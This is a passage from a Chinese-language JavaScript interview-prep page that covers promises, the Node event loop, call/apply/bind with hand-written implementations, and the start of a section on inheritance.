    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">"./JavaScript/promise/file/file1.txt"</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">"./JavaScript/promise/file/file1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="33、用js实现sleep，用promise"><a href="#33、用js实现sleep，用promise" class="headerlink" title="33、用js实现sleep，用promise"></a>33、用js实现sleep，用promise</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">SLeep_p</span><span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">SLeep_p</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"kif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h3 id="34、js执行顺序的题目，涉及到settimeout、console、process-nextTick、promise-then"><a href="#34、js执行顺序的题目，涉及到settimeout、console、process-nextTick、promise-then" class="headerlink" title="34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then"></a>34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>参考答案：</strong></p>
<p>综合的执行顺序就是： <code>3——&gt;4——&gt;6——&gt;8——&gt;7——&gt;5——&gt;start: 7.009ms——&gt;1——&gt;2</code></p>
<p><strong>解析：</strong></p>
<p>本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下：</p>
<ol>
<li>所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack)</li>
<li>在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务</li>
<li>一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行</li>
<li>主线程不断重复上面的第三步</li>
</ol>
<p>在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出<code>3、4、6、8</code>。当主线程任务执行完毕后，再从Event Loop中读取任务。</p>
<p>Event Loop读取任务的先后顺序，取决于任务队列（Job queue）中对于不同任务读取规则的限定。</p>
<p>在Job queue中的队列分为两种类型：</p>
<p><code>宏任务 Macrotask</code> 宏任务是指Event Loop在<strong>每个阶段</strong>执行的任务</p>
<p><code>微任务 Microtask</code> 微任务是指Event Loop在<strong>每个阶段之间</strong>执行的任务</p>
<p>我们举例来看执行顺序的规定，我们假设</p>
<p>宏任务队列包含任务: A1, A2 , A3</p>
<p>微任务队列包含任务: B1, B2 , B3</p>
<p>执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。</p>
<p>了解完了<code>宏任务 Macrotask</code>和<code>微任务 Microtask</code>两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示：</p>
<p>宏任务 Macrotask队列真实包含任务：</p>
<pre class="line-numbers language-none"><code class="language-none">script(主程序代码),setTimeout, setInterval, setImmediate, I&#x2F;O, UI rendering<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>微任务 Microtask队列真实包含任务：</p>
<pre class="line-numbers language-none"><code class="language-none">process.nextTick, Promises, Object.observe, MutationObserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由此我们得到的执行顺序应该为：</p>
<pre class="line-numbers language-none"><code class="language-none">script(主程序代码)—&gt;process.nextTick—&gt;Promises...——&gt;setTimeout——&gt;setInterval——&gt;setImmediate——&gt; I&#x2F;O——&gt;UI rendering<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
</svg>
</span><p>在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs</p></blockquote>
<p>我们的题目相对复杂，但是要注意，我们在定义promise的时候，promise构造部分是同步执行的</p>
<p>接下来我们分析我们的题目，首先分析Job queue的执行顺序：</p>
<pre class="line-numbers language-none"><code class="language-none">script(主程序代码)——&gt;process.nextTick——&gt;promise——&gt;setTimeout——&gt;setImmediate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序）</li>
<li>process.nextTick: 输出7</li>
<li>promise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd(‘start’)</li>
<li>setImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时</li>
<li>setTimeout ： 输出2</li>
</ul>
<h3 id="35、call-appy-bind的作用和区别"><a href="#35、call-appy-bind的作用和区别" class="headerlink" title="35、call appy bind的作用和区别"></a>35、call appy bind的作用和区别</h3><p><strong>参考答案：</strong></p>
<p>作用：</p>
<p> 都可以改变函数内部的this指向。</p>
<p>区别点：</p>
<ol>
<li>call 和 apply 会调用函数，并且改变函数内部this指向。</li>
<li>call 和 apply 传递的参数不一样，call 传递参数arg1,arg2…形式 apply 必须数组形式[arg]</li>
<li>bind 不会调用函数，可以改变函数内部this指向。</li>
</ol>
<p><strong>解析：</strong></p>
<p>call方法</p>
<p>改变函数内部this指向</p>
<p>call()方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的this指向。</p>
<p>写法：fun.call(thisArg, arg1, arg3, …) &#x2F;&#x2F; thisArg为想要指向的对象，arg1,arg3为参数</p>
<p>call 的主要作用也可以实现继承</p>
<pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>apply方法</p>
<p>apply()方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的this指向。</p>
<p>写法：fun.apply(thisArg, [argsArray])</p>
<ul>
<li>thisArg:在fun函数运行时指定的this值</li>
<li>argsArray:传递的值，必须包含在数组里面</li>
<li>返回值就是函数的返回值，因为他就是调用函数</li>
</ul>
<p>apply的主要应用，比如可以利用apply可以求得数组中最大值</p>
<pre class="line-numbers language-none"><code class="language-none">const arr &#x3D; [1, 22, 3, 44, 5, 66, 7, 88, 9];&#96;&#96;const max &#x3D; Math.max.apply(Math, arr);&#96;&#96;console.log(max);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>bind方法</p>
<p>bind()方法不会调用函数，但是能改变函数内部this指向</p>
<p>写法：fun.bind(thisArg, arg1, arg2, …)</p>
<ul>
<li>thisArg:在fun函数运行时指定的this值</li>
<li>arg1,arg2:传递的其他参数</li>
<li>返回由指定的this值和初始化参数改造的原函数拷贝</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">var&#96; &#96;o &#x3D; &#123;&#96;&#96;  &#96;&#96;name: &#96;&#96;&quot;lisa&quot;&#96;&#96;&#125;;&#96;&#96;function&#96; &#96;fn() &#123;&#96;&#96;  &#96;&#96;console.log(&#96;&#96;this&#96;&#96;);&#96;&#96;&#125;&#96;&#96;var&#96; &#96;f &#x3D; fn.bind(o);&#96;&#96;f();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>bind应用</p>
<p>如果有的函数我们不需要立即调用，但是又需要改变这个函数的this指向，此时用bind再合适不过了</p>
<pre class="line-numbers language-none"><code class="language-none">const btns &#x3D; document.querySelectorAll(&#96;&#96;&quot;button&quot;&#96;&#96;);&#96;&#96;for&#96; &#96;(let i &#x3D; 0; i &lt; btns.length; i++) &#123;&#96;&#96;  &#96;&#96;btns[i].onclick &#x3D; &#96;&#96;function&#96;&#96;() &#123;&#96;&#96;   &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;true&#96;&#96;;&#96;&#96;   &#96;&#96;setTimeout(&#96;&#96;    &#96;&#96;function&#96;&#96;() &#123;&#96;&#96;     &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;false&#96;&#96;;&#96;&#96;    &#96;&#96;&#125;.bind(&#96;&#96;this&#96;&#96;),&#96;&#96;    &#96;&#96;2000&#96;&#96;   &#96;&#96;);&#96;&#96;  &#96;&#96;&#125;;&#96;&#96;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>扩展:</strong></p>
<p>主要应用场景：</p>
<ol>
<li>call 经常做继承。</li>
<li>apply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。</li>
<li>bind 不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。</li>
</ol>
<h4 id="手写bind"><a href="#手写bind" class="headerlink" title="手写bind"></a>手写bind</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// bind体验</span>
<span class="token comment">// 改变this指向</span>

<span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// func(1, 2, 3, 4)</span>
<span class="token comment">// undefined</span>
<span class="token comment">// [ 1, 2, 3, 4 ]</span>

<span class="token keyword">let</span> Fu <span class="token operator">=</span> <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
<span class="token comment">// Fu()</span>
<span class="token comment">// &#123; a: 1 &#125;</span>
<span class="token comment">// [ 1, 2, 3, 4 ]</span>
<span class="token keyword">let</span> Fu2 <span class="token operator">=</span> <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
<span class="token comment">// Fu2()</span>
<span class="token comment">// 1</span>
<span class="token comment">// [ 1, 2, 3, 4 ]</span>

<span class="token comment">// bind实现思路：</span>
<span class="token comment">// 判断是否是函数调用，若非函数调用抛出异常</span>

<span class="token comment">// 返回函数</span>

<span class="token comment">// 判断函数的调用方式，是否是被new出来的</span>
<span class="token comment">// new出来的话，返回空对象，但是实例的 __ proto__ 指向_this的prototype</span>
<span class="token keyword">var</span> age <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> gender <span class="token operator">=</span> <span class="token string">'female'</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">11</span><span class="token punctuation">,</span>
    <span class="token literal-property property">gender</span><span class="token operator">:</span> <span class="token string">'male'</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//   console.log(this.age);</span>
    <span class="token comment">//   console.log(this.gender);</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>gender<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">Test</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myBind</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    obj<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">this</span>
    <span class="token keyword">let</span> result
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        result <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span>
        <span class="token keyword">delete</span> obj<span class="token punctuation">.</span>fn
        <span class="token keyword">return</span> result
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
Test<span class="token punctuation">.</span><span class="token function">myBind</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="手写call"><a href="#手写call" class="headerlink" title="手写call"></a>手写call</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 思路</span>
<span class="token comment">// 判断是否是函数调用，若非函数调用抛异常</span>
<span class="token comment">// 通过新对象（context）来调用函数</span>
<span class="token comment">// 给context创建一个fn设置为需要调用的函数</span>
<span class="token comment">// 结束调用完之后删除fn</span>


<span class="token comment">// Function.prototype.myCall = function (contents) &#123;</span>
<span class="token comment">//     //判断是否是函数调用，不是就抛出异常</span>
<span class="token comment">//     //这里的this 就是调用my_call的</span>
<span class="token comment">//     if (typeof this !== 'function') &#123;</span>
<span class="token comment">//         return</span>
<span class="token comment">//     &#125;</span>
<span class="token comment">//     // 不传参默认为window</span>
<span class="token comment">//     contents = contents || window</span>
<span class="token comment">//     // 保存this</span>
<span class="token comment">//     contents.fn = this</span>
<span class="token comment">//     // 获取参数</span>
<span class="token comment">//     let args = [...arguments].slice(1)</span>
<span class="token comment">//     let result = contents.fn(...args)</span>
<span class="token comment">//     delete contents.fn</span>

<span class="token comment">//     return result</span>

<span class="token comment">// &#125;</span>
<span class="token keyword">var</span> age <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> gender <span class="token operator">=</span> <span class="token string">'female'</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">11</span><span class="token punctuation">,</span>
    <span class="token literal-property property">gender</span><span class="token operator">:</span> <span class="token string">'male'</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//   console.log(this.age);</span>
    <span class="token comment">//   console.log(this.gender);</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>gender<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// Test(3, 5);</span>
<span class="token comment">// Test.call(obj, 22, 33);</span>

<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myCall</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">this</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>
    obj<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">this</span>
    <span class="token keyword">let</span> result <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span>
    <span class="token keyword">delete</span> obj<span class="token punctuation">.</span>fn
    <span class="token keyword">return</span> result
<span class="token punctuation">&#125;</span>
Test<span class="token punctuation">.</span><span class="token function">myCall</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="手写apply"><a href="#手写apply" class="headerlink" title="手写apply"></a>手写apply</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 思路</span>
<span class="token comment">// 判断是否是函数调用，若非函数调用抛异常</span>
<span class="token comment">// 通过新对象（context）来调用函数</span>
<span class="token comment">// 给context创建一个fn设置为需要调用的函数</span>
<span class="token comment">// 结束调用完之后删除fn</span>


<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myApply</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">context</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">this</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>
    context <span class="token operator">=</span> context <span class="token operator">||</span> window
    context<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">this</span>
    <span class="token keyword">let</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> result <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span>
    <span class="token keyword">delete</span> context<span class="token punctuation">.</span>fn
    <span class="token keyword">return</span> result
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="36、继承，优缺点"><a href="#36、继承，优缺点" class="headerlink" title="36、继承，优缺点"></a>36、继承，优缺点</h3><p><strong>参考答案：</strong></p>
<ul>
<li>继承的好处<ul>
<li>a：提高了代码的复用性</li>
<li>b：提高了代码的维护性</li>
<li>c：让类与类之间产生了关系，是多态的前提</li>
</ul>
</li>
<li>继承的弊端<ul>
<li>类的耦合性增强了,但是开发的原则：高内聚，低耦合。</li>
</ul>
</li>
</ul>
<h3 id="37、ES5-js继承的方法和优缺点"><a href="#37、ES5-js继承的方法和优缺点" class="headerlink" title="37、ES5 js继承的方法和优缺点"></a>37、ES5 js继承的方法和优缺点</h3><p><strong>参考答案：</strong></p>
<ol>
<li><p>原型链继承</p>
<p>实现方式：将子类的原型链指向父类的对象实例</p>
